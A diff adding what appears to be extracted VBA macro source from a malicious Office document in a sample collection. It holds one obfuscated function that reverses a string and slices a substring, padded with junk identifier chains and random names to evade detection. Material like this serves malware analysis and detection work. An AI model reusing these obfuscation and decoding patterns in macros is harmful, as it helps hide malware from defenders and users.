@@ -1,0 +1,20 @@
+Filename     : ./macros/2be1e08de1225ecf1aadce60a78704eb13e0f4ceea23bf10047593fc64531101
+OLE stream   : Macros/VBA/qiALrrrUimpb
+VBA filename : qiALrrrUimpb.bas
+----------------------------------------
+Attribute VB_Name = "qiALrrrUimpb"
+Function ytgUBhjkgbksad(ByVal MCsEMojcOmtzN As String, FOjtIqTFssqK, BpHRobKGz)
+On Error Resume Next
+jPUNjWaPrvPYcIBWanMw.nfVFQXDPwNZvJFTdLlFiTzmlnOi.wIzdcivkzIPzXAuipcTDitOBGP.oskRBoMQoOvTiJidDVGLT
+EvKufIFuwXMEH.PqOKKjFUuJptzPKfzEHjooGGJEL.QYGaBpOMHwBjzjBBFlIpjSXIwYDa.HBFYLEVCOsJBwXDDXjEnFAXv
+LzAwdcmnczvvKnffzrt.oluUEYowniHiJDAGVEkPXOVYIHNvZ.FJdzjZCjtEonAz.QlHnYKuGiaaPWMzLtZfZzAMWaDo
+rAiGWWqAvOvWz = jbkNXfr + StrReverse(MCsEMojcOmtzN) + FIBzLCzWG
+hbnlkNtGUHl = jUwsvN + Mid(rAiGWWqAvOvWz, FOjtIqTFssqK, BpHRobKGz) + YuQZkNUVj
+DpMrqUaGkYhNvApQPXUOn.XszkazVujcbcwjtSpzVmKpn.zPjUzzAUnXSTsGu.kqrFlSEJWzhVtAVhFolLOB
+jbHpZNaZjErBTzhZjKZzAPibmBlN.VjPjtIdidfvwX.RBwCkXOEAoDwTzfCYcMVOVcRZpEuD.iBcRNZnzAqpQjbjzojwaHS
+CjvZjcuTUBUKBTCkGPZbWfzm.lcBYvcYLRaiR.GWGWVPOQiilwsLiqNWlJYvztvYZvw.sUSGICVzKiXkHwPbDQqUEEwH
+LXMbwqSSulRdlDfVNMClo.BiTUJFdfoXKfziIYNsERMNzwR.KzqrtWnWWiHchNoO.uTGGAMpzKhWbnjVDwuipwdoraIaQl
+ytgUBhjkgbksad = rcwPDiL + hbnlkNtGUHl + JmAsjp
+viBmYkSKZAQiOjsmZO.ptdYcqrqlroEuzaiaYiMaZSZPnAwZ.AbdjzYRKZvhuhTkwV.oBSOvCZQaEIpqvQUqNaLzB
+QziifswoSRUHYwmf.JjzNBjEliNcWVJfmoCOMX.YbPqXVnsVEiwBQEzOPitAfWSzIpU.wXTEPLVzLMizmrXoXIOipnwi
+End Function
